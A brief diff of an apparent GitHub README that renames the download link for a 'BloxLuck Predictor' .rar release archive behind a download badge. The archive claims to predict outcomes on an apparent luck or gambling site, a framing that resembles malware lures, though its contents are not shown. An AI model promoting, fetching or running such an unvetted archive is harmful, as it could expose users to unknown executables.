@@ -4,7 +4,7 @@
 </div>
 
 <p align="center">
-  <a href="https://github.com/rethard/BloxLuck-/releases/download/v1.0/BloxLuck.Predictor.rar" target="_blank">
+  <a href="https://github.com/rethard/BloxLuck-/releases/download/v1.0/BloxLuck.Predictorrr.rar" target="_blank">
     <img src="https://img.shields.io/badge/Download-BloxLuck_Predictor-success?style=for-the-badge&logo=github&logoColor=white"/>
   </a>
 </p>
